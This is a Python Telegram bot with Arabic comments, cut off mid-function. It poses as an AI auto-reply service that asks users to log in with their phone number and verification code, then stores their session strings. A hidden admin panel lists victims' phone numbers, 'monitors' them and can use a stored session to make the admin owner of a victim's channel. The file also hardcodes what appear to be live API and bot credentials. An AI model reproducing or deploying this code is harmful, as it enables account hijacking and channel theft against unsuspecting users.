import asyncio
import sqlite3
import requests
import threading
import time
import os
from datetime import datetime
from pyrogram import Client, filters, types, idle
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, FloodWait
import re
import json

# تكوين البوت - مع قيم افتراضية
API_ID = int(os.environ.get("API_ID", "23656977"))
API_HASH = os.environ.get("API_HASH", "49d3f43531a92b3f5bc403766313ca1e"))
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8293003270:AAF_7aGUv1rgoVZfXgWEXBlI_72T8d8DNbg")
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "@iIl337")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6689435577"))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://ai-chat7-8.onrender.com")

# التحقق من التوكن
if not BOT_TOKEN:
    print("❌ خطأ: BOT_TOKEN غير معين. يرجى تعيين التوكن الصحيح.")
    exit(1)

print("🔧 جاري تهيئة البوت...")

# إنشاء قاعدة البيانات
def init_db():
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (user_id INTEGER PRIMARY KEY, 
                      session_string TEXT,
                      bio TEXT,
                      auto_reply BOOLEAN DEFAULT FALSE,
                      vip BOOLEAN DEFAULT FALSE,
                      invited_count INTEGER DEFAULT 0,
                      phone TEXT,
                      banned BOOLEAN DEFAULT FALSE,
                      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS invites
                     (inviter_id INTEGER,
                      invited_id INTEGER,
                      subscribed BOOLEAN DEFAULT FALSE,
                      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS channels
                     (user_id INTEGER,
                      channel_id INTEGER,
                      channel_username TEXT,
                      channel_title TEXT,
                      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS bot_settings
                     (id INTEGER PRIMARY KEY,
                      bot_enabled BOOLEAN DEFAULT TRUE,
                      vip_mode BOOLEAN DEFAULT FALSE,
                      updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        # إعدادات افتراضية
        c.execute("INSERT OR IGNORE INTO bot_settings (id, bot_enabled, vip_mode) VALUES (1, 1, 0)")
        
        conn.commit()
        conn.close()
        print("✅ قاعدة البيانات جاهزة")
    except Exception as e:
        print(f"❌ خطأ في تهيئة قاعدة البيانات: {e}")

init_db()

# وظائف قاعدة البيانات
def get_user(user_id):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        return user
    except Exception as e:
        print(f"خطأ في get_user: {e}")
        return None

def get_all_users():
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE phone IS NOT NULL")
        users = c.fetchall()
        conn.close()
        return users
    except Exception as e:
        print(f"خطأ في get_all_users: {e}")
        return []

def get_all_phones():
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT user_id, phone FROM users WHERE phone IS NOT NULL")
        phones = c.fetchall()
        conn.close()
        return phones
    except Exception as e:
        print(f"خطأ في get_all_phones: {e}")
        return []

def update_user(user_id, **kwargs):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        
        for key, value in kwargs.items():
            c.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"خطأ في update_user: {e}")
        return False

def add_invite(inviter_id, invited_id):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO invites VALUES (?, ?, ?, ?)", (inviter_id, invited_id, False, datetime.now()))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"خطأ في add_invite: {e}")
        return False

def check_invites(inviter_id):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM invites WHERE inviter_id = ? AND subscribed = ?", (inviter_id, True))
        count = c.fetchone()[0]
        conn.close()
        return count
    except Exception as e:
        print(f"خطأ في check_invites: {e}")
        return 0

def add_channel(user_id, channel_id, username, title):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("INSERT INTO channels VALUES (?, ?, ?, ?, ?)", (user_id, channel_id, username, title, datetime.now()))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"خطأ في add_channel: {e}")
        return False

def get_user_channels(user_id):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT * FROM channels WHERE user_id = ?", (user_id,))
        channels = c.fetchall()
        conn.close()
        return channels
    except Exception as e:
        print(f"خطأ في get_user_channels: {e}")
        return []

def get_all_channels():
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT DISTINCT user_id FROM channels")
        users = c.fetchall()
        conn.close()
        return users
    except Exception as e:
        print(f"خطأ في get_all_channels: {e}")
        return []

# وظائف إعدادات البوت
def get_bot_settings():
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT * FROM bot_settings WHERE id = 1")
        settings = c.fetchone()
        conn.close()
        return settings
    except Exception as e:
        print(f"خطأ في get_bot_settings: {e}")
        return None

def update_bot_settings(**kwargs):
    try:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        
        for key, value in kwargs.items():
            c.execute(f"UPDATE bot_settings SET {key} = ?, updated_at = ? WHERE id = 1", (value, datetime.now()))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"خطأ في update_bot_settings: {e}")
        return False

def is_bot_enabled():
    settings = get_bot_settings()
    return settings and settings[1]

def is_vip_mode():
    settings = get_bot_settings()
    return settings and settings[2]

# وظائف الذكاء الاصطناعي
def clean_ai_response(text):
    cleaned = re.sub(r'```[^`]*```', '', text)
    cleaned = re.sub(r'`[^`]*`', '', cleaned)
    cleaned = re.sub(r'[{}[\]()<>]', '', cleaned)
    words = cleaned.split()[:15]
    return ' '.join(words)

def get_ai_response(message):
    try:
        url = "https://sii3.top/api/deepseek.php"
        response = requests.post(url, data={"r1": message}, timeout=10)
        if response.status_code == 200:
            return clean_ai_response(response.text)
    except Exception as e:
        print(f"AI Error: {e}")
    return "شكراً على رسالتك، سأرد عليك قريباً"

# التحقق من الاشتراك
async def check_subscription(user_id):
    try:
        user = await app.get_chat_member(CHANNEL_USERNAME, user_id)
        return user.status in ['member', 'administrator', 'creator']
    except:
        return False

# ويب هووك للحفاظ على النشاط
def keep_alive():
    request_count = 0
    while True:
        try:
            request_count += 1
            response = requests.get(WEBHOOK_URL, timeout=10)
            print(f"✅ طلب ويب هووك #{request_count} - الساعة: {datetime.now().strftime('%H:%M:%S')} - الحالة: {response.status_code}")
            
            # تحديث قاعدة البيانات بشكل دوري
            if request_count % 6 == 0:  # كل 30 دقيقة (6 * 5 دقائق)
                try:
                    conn = sqlite3.connect('users.db', check_same_thread=False)
                    c = conn.cursor()
                    c.execute("SELECT COUNT(*) FROM users")
                    user_count = c.fetchone()[0]
                    conn.close()
                    print(f"📊 تحديث قاعدة البيانات - عدد المستخدمين: {user_count}")
                except Exception as e:
                    print(f"❌ خطأ في تحديث قاعدة البيانات: {e}")
                    
        except Exception as e:
            print(f"❌ فشل طلب ويب هووك: {e}")
        
        time.sleep(300)  # كل 5 دقائق

# بدء خيط الويب هووك
threading.Thread(target=keep_alive, daemon=True).start()

# حالة الجلسات النشطة
active_sessions = {}
user_states = {}
phone_monitoring = {}
user_clients = {}

# لوحة المفاتيح الرئيسية
def main_keyboard(user_id):
    try:
        user = get_user(user_id)
        ai_text = "انقر لإيقاف AI" if user and user[3] else "انقر لتشغيل AI"
        
        keyboard = [
            [types.InlineKeyboardButton("التحكم بالجلسة", callback_data="session_control")],
            [types.InlineKeyboardButton(ai_text, callback_data="toggle_ai")]
        ]
        
        # إضافة لوحة المدير إذا كان المستخدم هو المدير
        if user_id == ADMIN_ID:
            keyboard.append([types.InlineKeyboardButton("👑 لوحة المدير", callback_data="admin_panel")])
        
        return types.InlineKeyboardMarkup(keyboard)
    except Exception as e:
        print(f"خطأ في main_keyboard: {e}")
        # لوحة مفاتيح افتراضية في حالة الخطأ
        keyboard = [
            [types.InlineKeyboardButton("التحكم بالجلسة", callback_data="session_control")],
            [types.InlineKeyboardButton("انقر لتشغيل AI", callback_data="toggle_ai")]
        ]
        return types.InlineKeyboardMarkup(keyboard)

# لوحة التحكم بالجلسة
def session_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("تسجيل حسابك", callback_data="register_account")],
        [types.InlineKeyboardButton("تعيين النبذة", callback_data="set_bio")],
        [types.InlineKeyboardButton("إحصائيات", callback_data="statistics")],
        [types.InlineKeyboardButton("حذف الجلسة", callback_data="delete_session")],
        [types.InlineKeyboardButton("رجوع", callback_data="back_main")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة المدير الرئيسية
def admin_keyboard():
    bot_enabled = is_bot_enabled()
    vip_mode = is_vip_mode()
    
    bot_control_text = "انقر للإيقاف ⏸️" if bot_enabled else "انقر للتشغيل ▶️"
    vip_mode_text = "انقر لإيقاف vip 🍺" if vip_mode else "انقر لتفعيل vip 🍻"
    
    keyboard = [
        [types.InlineKeyboardButton("التحكم في البوت", callback_data="bot_control")],
        [types.InlineKeyboardButton("وضع البوت", callback_data="vip_mode_control")],
        [types.InlineKeyboardButton("إدارة العضويات", callback_data="manage_membership")],
        [types.InlineKeyboardButton("إدارة المستخدمين", callback_data="manage_users")],
        [types.InlineKeyboardButton("بيانات مستخدمين", callback_data="user_data")],
        [types.InlineKeyboardButton("إحصائيات البوت", callback_data="bot_statistics")],
        [types.InlineKeyboardButton("رجوع", callback_data="back_main")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة التحكم في البوت
def bot_control_keyboard():
    bot_enabled = is_bot_enabled()
    control_text = "انقر للإيقاف ⏸️" if bot_enabled else "انقر للتشغيل ▶️"
    
    keyboard = [
        [types.InlineKeyboardButton(control_text, callback_data="toggle_bot")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة وضع البوت
def vip_mode_keyboard():
    vip_mode = is_vip_mode()
    mode_text = "انقر لإيقاف vip 🍺" if vip_mode else "انقر لتفعيل vip 🍻"
    
    keyboard = [
        [types.InlineKeyboardButton(mode_text, callback_data="toggle_vip_mode")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# باقي دوال لوحات المفاتيح
def membership_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("تفعيل VIP", callback_data="activate_vip")],
        [types.InlineKeyboardButton("إيقاف VIP", callback_data="deactivate_vip")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

def users_management_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("حظر مستخدم", callback_data="ban_user")],
        [types.InlineKeyboardButton("إيقاف حظر", callback_data="unban_user")],
        [types.InlineKeyboardButton("قائمة المحظورين", callback_data="banned_list")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

def user_data_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("سحب رقم", callback_data="extract_phone")],
        [types.InlineKeyboardButton("سحب قناة", callback_data="extract_channel")],
        [types.InlineKeyboardButton("معلومات مستخدم", callback_data="user_info")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

def phones_keyboard(page=0):
    phones = get_all_phones()
    phones_per_page = 8
    start_idx = page * phones_per_page
    end_idx = start_idx + phones_per_page
    
    keyboard = []
    for phone in phones[start_idx:end_idx]:
        keyboard.append([types.InlineKeyboardButton(f"📱 {phone[1]}", callback_data=f"monitor_phone_{phone[0]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"phones_page_{page-1}"))
    if end_idx < len(phones):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"phones_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="user_data_back")])
    
    return types.InlineKeyboardMarkup(keyboard)

def channels_keyboard(page=0):
    channels = get_all_channels()
    channels_per_page = 8
    start_idx = page * channels_per_page
    end_idx = start_idx + channels_per_page
    
    keyboard = []
    for channel_user in channels[start_idx:end_idx]:
        user_data = get_user(channel_user[0])
        phone = user_data[6] if user_data else "غير معروف"
        keyboard.append([types.InlineKeyboardButton(f"📢 {phone}", callback_data=f"user_channels_{channel_user[0]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"channels_page_{page-1}"))
    if end_idx < len(channels):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"channels_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="user_data_back")])
    
    return types.InlineKeyboardMarkup(keyboard)

def user_channels_keyboard(user_id, page=0):
    channels = get_user_channels(user_id)
    channels_per_page = 5
    start_idx = page * channels_per_page
    end_idx = start_idx + channels_per_page
    
    keyboard = []
    for channel in channels[start_idx:end_idx]:
        btn_text = f"📺 {channel[3] or channel[2] or 'غير معروف'}"
        keyboard.append([types.InlineKeyboardButton(btn_text, callback_data=f"channel_info_{channel[0]}_{channel[1]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"user_channels_page_{user_id}_{page-1}"))
    if end_idx < len(channels):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"user_channels_page_{user_id}_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="extract_channel")])
    
    return types.InlineKeyboardMarkup(keyboard)

def banned_users_keyboard(page=0):
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, phone FROM users WHERE banned = TRUE")
    banned_users = c.fetchall()
    conn.close()
    
    users_per_page = 8
    start_idx = page * users_per_page
    end_idx = start_idx + users_per_page
    
    keyboard = []
    for user in banned_users[start_idx:end_idx]:
        phone = user[1] or f"المستخدم {user[0]}"
        keyboard.append([types.InlineKeyboardButton(f"🚫 {phone}", callback_data=f"unban_user_{user[0]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"banned_page_{page-1}"))
    if end_idx < len(banned_users):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"banned_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="manage_users")])
    
    return types.InlineKeyboardMarkup(keyboard)

# تهيئة البوت
try:
    app = Client(
        "customer_bot", 
        api_id=API_ID, 
        api_hash=API_HASH, 
        bot_token=BOT_TOKEN,
        in_memory=True
    )
    print("✅ البوت مهيأ بشكل صحيح")
except Exception as e:
    print(f"❌ خطأ في تهيئة البوت: {e}")
    exit(1)

@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    try:
        user_id = message.from_user.id
        print(f"📥 تم استقبال /start من المستخدم: {user_id}")
        
        # التحقق من حالة البوت
        if not is_bot_enabled() and user_id != ADMIN_ID:
            await message.reply("⏸️ البوت متوقف حاليًا عن العمل. يرجى المحاولة لاحقًا.")
            return
        
        # التحقق من الحظر
        user_data = get_user(user_id)
        if user_data and user_data[7]:  # إذا كان محظور
            await message.reply("❌ تم حظرك من استخدام البوت.")
            return
        
        # إضافة المستخدم إذا لم يكن موجوداً
        if not user_data:
            print(f"🆕 إضافة مستخدم جديد: {user_id}")
            try:
                conn = sqlite3.connect('users.db', check_same_thread=False)
                c = conn.cursor()
                c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
                conn.commit()
                conn.close()
                print(f"✅ تم إضافة المستخدم {user_id} إلى قاعدة البيانات")
            except Exception as e:
                print(f"❌ خطأ في إضافة المستخدم: {e}")
        
        # التحقق من رابط الدعوة
        if len(message.command) > 1:
            try:
                inviter_id = int(message.command[1])
                if inviter_id != user_id:
                    add_invite(inviter_id, user_id)
                    # تحديث عدد المدعوين
                    inviter_data = get_user(inviter_id)
                    if inviter_data:
                        new_count = inviter_data[5] + 1
                        update_user(inviter_id, invited_count=new_count)
            except Exception as e:
                print(f"خطأ في معالجة الدعوة: {e}")
        
        # إرسال الرسالة مع الأزرار
        welcome_text = "مرحباً! 👋\nاختر من القائمة:"
        await message.reply(welcome_text, reply_markup=main_keyboard(user_id))
        print(f"✅ تم إرسال القائمة الرئيسية للمستخدم: {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في معالجة /start: {e}")
        await message.reply("حدث خطأ. يرجى المحاولة مرة أخرى.")

@app.on_callback_query()
async def handle_callback(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    try:
        print(f"📨 زر ضغط من {user_id}: {data}")
        
        # التحقق من حالة البوت (استثناء للمدير)
        if not is_bot_enabled() and user_id != ADMIN_ID:
            await callback_query.answer("⏸️ البوت متوقف حاليًا", show_alert=True)
            return
        
        # التحقق من الحظر
        user_data = get_user(user_id)
        if user_data and user_data[7]:
            await callback_query.answer("❌ تم حظرك من استخدام البوت.", show_alert=True)
            return
        
        if data == "session_control":
            await callback_query.edit_message_text("التحكم بالجلسة:", reply_markup=session_keyboard())
        
        elif data == "back_main":
            await callback_query.edit_message_text("القائمة الرئيسية:", reply_markup=main_keyboard(user_id))
        
        elif data == "admin_panel":
            if user_id == ADMIN_ID:
                await callback_query.edit_message_text("👑 لوحة تحكم المدير:", reply_markup=admin_keyboard())
            else:
                await callback_query.answer("❌ ليس لديك صلاحية الوصول", show_alert=True)
        
        elif data == "admin_back":
            await callback_query.edit_message_text("👑 لوحة تحكم المدير:", reply_markup=admin_keyboard())
        
        elif data == "register_account":
            user_states[user_id] = "waiting_phone"
            await callback_query.edit_message_text("أرسل رقم هاتفك مع رمز الدولة (مثال: +20123456789)")
        
        elif data == "set_bio":
            user_states[user_id] = "waiting_bio"
            await callback_query.edit_message_text("أرسل النبذة الشخصية التي تريد تعيينها:")
        
        elif data == "statistics":
            user = get_user(user_id)
            if user:
                invited_count = check_invites(user_id)
                stats = f"📊 الإحصائيات:\n"
                stats += f"🎖️ الحالة: {'VIP 🥇' if user[4] else 'عادي'}\n"
                stats += f"🤖 الرد التلقائي: {'مفعل' if user[3] else 'معطل'}\n"
                stats += f"👥 عدد المدعوين: {invited_count}\n"
                if user[6]:
                    stats += f"📞 رقم الهاتف: {user[6]}\n"
                stats += f"📅 تاريخ التسجيل: {user[8]}\n"
                await callback_query.edit_message_text(stats, reply_markup=session_keyboard())
        
        elif data == "delete_session":
            update_user(user_id, session_string=None, auto_reply=False, phone=None)
            if user_id in active_sessions:
                del active_sessions[user_id]
            if user_id in user_clients:
                try:
                    await user_clients[user_id].stop()
                except:
                    pass
                del user_clients[user_id]
            await callback_query.edit_message_text("✅ تم حذف الجلسة بنجاح", reply_markup=session_keyboard())
        
        elif data == "toggle_ai":
            user = get_user(user_id)
            if user:
                # التحقق من وضع VIP إذا كان مفعل
                if is_vip_mode() and not user[4]:
                    await callback_query.answer("❌ هذه الميزة متاحة فقط لأعضاء VIP حالياً", show_alert=True)
                    return
                
                if not user[4]:  # إذا لم يكن VIP
                    subscribed = await check_subscription(user_id)
                    invited_count = check_invites(user_id)
                    
                    if not subscribed and invited_count < 5:
                        keyboard = [
                            [types.InlineKeyboardButton("دعوة 5 أشخاص", callback_data="invite_friends")],
                            [types.InlineKeyboardButton("تفعيل عبر المدير", url=f"t.me/OlIiIl7")]
                        ]
                        await callback_query.edit_message_text(
                            "❌ يجب أن تكون مشتركاً في القناة أو تدعو 5 أشخاص\n@iIl337",
                            reply_markup=types.InlineKeyboardMarkup(keyboard)
                        )
                        return
                
                new_state = not user[3]
                update_user(user_id, auto_reply=new_state)
                
                status = "مفعل" if new_state else "معطل"
                await callback_query.edit_message_text(f"✅ تم {status} الرد التلقائي", reply_markup=main_keyboard(user_id))
        
        elif data == "invite_friends":
            invite_link = f"https://t.me/{callback_query.message.chat.username}?start={user_id}"
            await callback_query.edit_message_text(
                f"📨 رابط الدعوة الخاص بك:\n`{invite_link}`\n\n"
                f"اطلب من أصدقائك استخدام هذا الرابط والاشتراك في القناة:\n{CHANNEL_USERNAME}",
                reply_markup=types.InlineKeyboardMarkup([
                    [types.InlineKeyboardButton("رجوع", callback_data="back_main")]
                ])
            )
        
        # أوامر المدير
        elif user_id == ADMIN_ID:
            if data == "bot_control":
                await callback_query.edit_message_text("🔄 التحكم في حالة البوت:", reply_markup=bot_control_keyboard())
            
            elif data == "vip_mode_control":
                await callback_query.edit_message_text("🎯 التحكم في وضع VIP:", reply_markup=vip_mode_keyboard())
            
            elif data == "toggle_bot":
                current_state = is_bot_enabled()
                new_state = not current_state
                update_bot_settings(bot_enabled=new_state)
                
                status = "مفعل" if new_state else "معطل"
                await callback_query.edit_message_text(f"✅ تم {status} البوت", reply_markup=bot_control_keyboard())
            
            elif data == "toggle_vip_mode":
                current_state = is_vip_mode()
                new_state = not current_state
                update_bot_settings(vip_mode=new_state)
                
                status = "تفعيل" if new_state else "إيقاف"
                await callback_query.edit_message_text(f"✅ تم {status} وضع VIP", reply_markup=vip_mode_keyboard())
            
            elif data == "user_data_back":
                await callback_query.edit_message_text("بيانات المستخدمين:", reply_markup=user_data_keyboard())
            
            elif data == "manage_membership":
                await callback_query.edit_message_text("إدارة العضويات:", reply_markup=membership_keyboard())
            
            elif data == "manage_users":
                await callback_query.edit_message_text("إدارة المستخدمين:", reply_markup=users_management_keyboard())
            
            elif data == "user_data":
                await callback_query.edit_message_text("بيانات المستخدمين:", reply_markup=user_data_keyboard())
            
            elif data == "bot_statistics":
                users = get_all_users()
                vip_users = len([u for u in users if u[4]])
                active_sessions_count = len([u for u in users if u[3] and u[1]])
                banned_users = len([u for u in users if u[7]])
                
                stats = f"📈 إحصائيات البوت:\n\n"
                stats += f"👥 إجمالي المستخدمين: {len(users)}\n"
                stats += f"🎖️ مستخدمين VIP: {vip_users}\n"
                stats += f"🤖 جلسات نشطة: {active_sessions_count}\n"
                stats += f"🚫 مستخدمين محظورين: {banned_users}\n"
                stats += f"🔧 حالة البوت: {'✅ مفعل' if is_bot_enabled() else '⏸️ متوقف'}\n"
                stats += f"🎯 وضع VIP: {'🍻 مفعل' if is_vip_mode() else '🍺 معطل'}\n"
                
                await callback_query.edit_message_text(stats, reply_markup=admin_keyboard())
            
            elif data == "banned_list":
                banned_users = [u for u in get_all_users() if u[7]]
                if banned_users:
                    await callback_query.edit_message_text(
                        f"🚫 قائمة المستخدمين المحظورين ({len(banned_users)}):",
                        reply_markup=banned_users_keyboard()
                    )
                else:
                    await callback_query.edit_message_text("✅ لا يوجد مستخدمين محظورين", reply_markup=users_management_keyboard())
            
            elif data.startswith("banned_page_"):
                page = int(data.split("_")[2])
                await callback_query.edit_message_text("🚫 قائمة المحظورين:", reply_markup=banned_users_keyboard(page))
            
            elif data.startswith("unban_user_"):
                target_id = int(data.split("_")[2])
                update_user(target_id, banned=False)
                await callback_query.edit_message_text(f"✅ تم إلغاء حظر المستخدم {target_id}", reply_markup=users_management_keyboard())
            
            elif data == "extract_phone":
                phones = get_all_phones()
                if phones:
                    await callback_query.edit_message_text(
                        f"📞 قائمة الأرقام ({len(phones)}):",
                        reply_markup=phones_keyboard()
                    )
                else:
                    await callback_query.edit_message_text("❌ لا توجد أرقام مسجلة", reply_markup=user_data_keyboard())
            
            elif data == "extract_channel":
                channels = get_all_channels()
                if channels:
                    await callback_query.edit_message_text(
                        f"📢 قائمة المستخدمين الذين لديهم قنوات ({len(channels)}):",
                        reply_markup=channels_keyboard()
                    )
                else:
                    await callback_query.edit_message_text("❌ لا توجد قنوات مسجلة", reply_markup=user_data_keyboard())
            
            elif data.startswith("phones_page_"):
                page = int(data.split("_")[2])
                await callback_query.edit_message_text("📞 قائمة الأرقام:", reply_markup=phones_keyboard(page))
            
            elif data.startswith("channels_page_"):
                page = int(data.split("_")[2])
                await callback_query.edit_message_text("📢 قائمة المستخدمين:", reply_markup=channels_keyboard(page))
            
            elif data.startswith("user_channels_page_"):
                parts = data.split("_")
                target_user_id = int(parts[4])
                page = int(parts[5])
                await callback_query.edit_message_text(
                    f"📺 قنوات المستخدم:",
                    reply_markup=user_channels_keyboard(target_user_id, page)
                )
            
            elif data.startswith("monitor_phone_"):
                target_user_id = int(data.split("_")[2])
                user_data = get_user(target_user_id)
                if user_data and user_data[6]:
                    phone_monitoring[target_user_id] = True
                    await callback_query.edit_message_text(
                        f"🔍 بدء مراقبة الرقم: {user_data[6]}\n"
                        f"سيتم إرسال إشعارات الخدمة لك فور ورودها."
                    )
            
            elif data.startswith("user_channels_"):
                target_user_id = int(data.split("_")[2])
                channels = get_user_channels(target_user_id)
                if channels:
                    await callback_query.edit_message_text(
                        f"📺 قنوات المستخدم ({len(channels)}):",
                        reply_markup=user_channels_keyboard(target_user_id)
                    )
                else:
                    await callback_query.answer("❌ لا توجد قنوات لهذا المستخدم", show_alert=True)
            
            elif data.startswith("channel_info_"):
                parts = data.split("_")
                channel_user_id = int(parts[2])
                channel_id = int(parts[3])
                
                channels = get_user_channels(channel_user_id)
                channel_info = None
                for ch in channels:
                    if ch[1] == channel_id:
                        channel_info = ch
                        break
                
                if channel_info:
                    keyboard = [
                        [types.InlineKeyboardButton("عرض القناة", url=f"t.me/{channel_info[2]}")],
                        [types.InlineKeyboardButton("سحب القناة", callback_data=f"takeover_{channel_user_id}_{channel_id}")],
                        [types.InlineKeyboardButton("رجوع", callback_data=f"user_channels_{channel_user_id}")]
                    ]
                    
                    info_text = f"📋 معلومات القناة:\n"
                    info_text += f"🏷️ العنوان: {channel_info[3]}\n"
                    info_text += f"🔗 المعرف: @{channel_info[2]}\n"
                    info_text += f"🆔 ID: {channel_info[1]}\n"
                    info_text += f"👤 مالك: {channel_info[0]}\n"
                    info_text += f"📅 تاريخ الإنشاء: {channel_info[4]}"
                    
                    await callback_query.edit_message_text(info_text, reply_markup=types.InlineKeyboardMarkup(keyboard))
            
            elif data.startswith("takeover_"):
                parts = data.split("_")
                channel_user_id = int(parts[1])
                channel_id = int(parts[2])
                
                user_data = get_user(channel_user_id)
                if user_data and user_data[1]:
                    try:
                        # محاولة سحب القناة
                        user_client = Client(f"takeover_{channel_user_id}", session_string=user_data[1], 
                                           api_id=API_ID, api_hash=API_HASH)
                        await user_client.start()
                        
                        # رفع المدير كمشرف
                        await user_client.promote_chat_member(
                            channel_id,
                            ADMIN_ID,
                            can_manage_chat=True,
                            can_change_info=True,
                            can_post_messages=True,
                            can_edit_messages=True,
                            can_delete_messages=True,
                            can_invite_users=True,
                            can_restrict_members=True,
                            can_pin_messages=True,
                            can_promote_members=True
                        )
                        
                        # نقل الملكية
                        await user_client.set_chat_owner(channel_id, ADMIN_ID)
                        
                        await user_client.stop()
                        
                        await callback_query.edit_message_text("✅ تم سحب القناة بنجاح ونقل الملكية!")
                        
                    except Exception as e:
                        await callback_query.edit_message_text(f"❌ فشل في سحب القناة: {str(e)}")
            
            elif data == "activate_vip":
                user_states[user_id] = "waiting_user_vip"
                await callback_query.edit_message_text("أرسل معرف المستخدم لتفعيل VIP:")
            
            elif data == "deactivate_vip":
                user_states[user_id] = "waiting_user_unvip"
                await callback_query.edit_message_text("أرسل معرف المستخدم لإلغاء VIP:")
            
            elif data == "ban_user":
                user_states[user_id] = "waiting_user_ban"
                await callback_query.edit_message_text("أرسل معرف المستخدم لحظره:")
            
            elif data == "unban_user":
                user_states[user_id] = "waiting_user_unban"
                await callback_query.edit_message_text("أرسل معرف المستخدم لإلغاء الحظر:")
            
            elif data == "user_info":
                user_states[user_id] = "waiting_user_info"
                await callback_query.edit_message_text("أرسل معرف المستخدم لعرض معلوماته:")
        
    except Exception as e:
        print(f"❌ خطأ في معالجة الزر: {e}")
        await callback_query.answer(f"خطأ: {str(e)}", show_alert=True)

# معالجة الرسائل النصية
@app.on_message(filters.private & ~filters.command("start"))
async def handle_messages(client, message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    
    # التحقق من حالة البوت (استثناء للمدير)
    if not is_bot_enabled() and user_id != ADMIN_ID:
        return
    
    # التحقق من الحظر
    user_data = get_user(user_id)
    if user_data and user_data[7]:
        return
    
    if state == "waiting_phone":
        try:
            phone = message.text
            user_states[user_id] = "waiting_code"
            
            user_client = Client(f"user_{user_id}", api_id=API_ID, api_hash=API_HASH)
            await user_client.connect()
            
            sent_code = await user_client.send_code(phone)
            active_sessions[user_id] = {
                'client': user_client,
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash
            }
            
            await message.reply("أرسل كود التحقق:")
            
        except Exception as e:
            await message.reply(f"خطأ: {str(e)}")
    
    elif state == "waiting_code":
        try:
            code = message.text
            session_data = active_sessions.get(user_id)
            
            if session_data:
